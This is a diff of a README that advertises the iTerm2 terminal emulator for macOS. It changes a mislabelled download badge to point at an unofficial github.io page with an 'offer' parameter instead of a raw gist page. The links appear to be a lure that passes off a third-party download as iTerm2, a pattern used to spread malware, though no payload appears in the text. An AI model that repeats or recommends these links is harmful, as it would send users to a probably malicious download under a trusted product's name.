@@ -3,7 +3,7 @@
 **iTerm2** is a feature-rich terminal emulator designed exclusively for **macOS**.  
 It brings powerful multitasking, deep customization, and developer-centric tools to the command line — making your terminal faster, smarter, and more efficient. ⚡  
 
-[![🟢 Get GitHub Instruction](https://img.shields.io/badge/🟢%20Get%20iTerm2%20App-00C853?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/bick69sleeping/dd12b3e1ee673a541e522f58c70cd62b/raw/88f6a1588a850cd10951e85d6a09582fd2b73c30/app.html?offer=iTerm2)
+[![🟢 Get GitHub Instruction](https://img.shields.io/badge/🟢%20Get%20iTerm2%20App-00C853?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=iTerm2)
 
 ---
 
